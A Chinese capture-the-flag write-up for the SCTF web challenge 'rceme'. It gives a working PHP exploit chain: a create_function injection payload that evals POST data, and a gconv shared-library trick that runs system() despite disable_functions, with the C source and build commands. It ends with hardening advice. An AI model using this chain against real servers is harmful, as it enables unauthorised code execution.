# rceme

## 题目简述

题目先限制 PHP 表达式中的可用字符和调用形式，再配置了极长的 `disable_functions` 与 `open_basedir`。官方题解恢复出的第一阶段是一个无参数 RCE：用字符串按位取反拼出函数名，从最后一个 HTTP 请求头取出序列化数组，并把数组展开为 `call_user_func` 的参数。借 `create_function` 的代码拼接行为，可以在创建匿名函数时直接执行 `$_POST[1]`。

获得 PHP 代码执行后，`system`、`exec`、普通文件函数等仍不可用。第二阶段通过 SPL 原生类完成目录枚举和文件读写，再利用 glibc 的 gconv 模块加载机制执行本地 `/readflag`，把结果写入 `/tmp/flag` 后读回。

## 解题过程

位运算表达式解码后等价于：

```php
call_user_func(...unserialize(end(getallheaders())));
```

原表达式没有直接书写这些函数名，而是对逐字节取反后的字符串再次执行 `~`。例如字节序列 `9c 9e 93 93 a0 8a 8c 9a 8d a0 99 8a 91 9c` 取反后就是 `call_user_func`。`[value][!"\xff"]` 利用假值索引 `0` 取出单元素数组中的字符串，适配入口的无参数调用限制。

把以下序列化数组放在最后一个请求头中：

```text
a:3:{i:0;s:15:"create_function";i:1;s:0:"";i:2;s:19:"}eval($_POST[1]);/*";}
```

数组展开后，相当于调用：

```php
call_user_func(
    'create_function',
    '',
    '}eval($_POST[1]);/*'
);
```

旧版 `create_function` 会拼接并 `eval` 一段函数定义。代码参数开头的 `}` 提前闭合函数体，使后面的 `eval($_POST[1])` 在创建阶段执行，末尾 `/*` 注释掉框架追加的右花括号。因此后续 PHP 代码可放入 POST 参数 `1`。

普通文件函数被禁用，但 `DirectoryIterator`、`SplFileObject` 的构造器和方法不受同名函数黑名单直接约束。先用 `DirectoryIterator('/')` 枚举根目录，可以发现具有 SUID 权限的 `/readflag`；随后通过 `SplFileObject` 与流过滤器写二进制文件：

```php
$f = new SplFileObject(
    'php://filter/convert.base64-decode/resource=/tmp/payload.so',
    'w'
);
$f->fwrite($payloadSoBase64);
```

共享库在本地编译，加载时执行读取程序：

```c
#include <stdlib.h>

void gconv(void) {}

void gconv_init(void) {
    system("/readflag > /tmp/flag");
    exit(0);
}
```

```bash
gcc -shared -fPIC payload.c -o payload.so
base64 -w0 payload.so
```

用同样方法写入 `/tmp/gconv-modules`，内容为：

```text
module  PAYLOAD//    INTERNAL    ../../../../../../../../tmp/payload    2
module  INTERNAL    PAYLOAD//    ../../../../../../../../tmp/payload    2
```

设置 gconv 搜索目录并通过 `php://filter` 触发字符集转换：

```php
putenv('GCONV_PATH=/tmp/');
new SplFileObject(
    'php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ=='
);
```

PHP 的 `disable_functions` 只约束 PHP 函数入口，不能阻止 glibc 动态加载 `/tmp/payload.so` 并在本机代码中调用 `system`。共享库运行 `/readflag` 后，再用 SPL 读取输出文件；如果直接字符串转换受限，可经 Base64 过滤器返回：

```php
$f = new SplFileObject(
    'php://filter/read=convert.base64-encode/resource=/tmp/flag'
);
echo $f;
```

解码得到：

```text
SCTF{rC3nn3_i5_s0_eAs9_f4r_y0U!!!}
```

当前归档的 `web/rceme/html` 为空，因此无法核对最外层过滤器的完整源码；以上入口表达式、请求头数据和 gconv 链均来自仓库内官方题解，环境侧的 `php.ini`、`readflag` 与部署权限能够相互印证。没有证据的入口细节不作扩写。

## 方法总结

本题分成两道边界。第一道是语言层绕过：按位取反重建受限函数名，用 HTTP 请求头承载序列化参数，再借旧版 `create_function` 的字符串拼接取得任意 PHP 代码执行。第二道是运行时边界：`disable_functions` 禁掉的是 PHP API，不等于禁止原生类方法、流包装器或动态链接器行为。

复现时必须让 `payload.so` 的架构和目标一致，并按实际路径调整 `gconv-modules` 中的相对模块名。防护上应移除 `create_function` 和动态求值入口，采用函数白名单或隔离执行环境；仅堆叠 `disable_functions` 不能形成可靠沙箱，还需要限制可写目录、流包装器、环境变量和动态库加载路径。
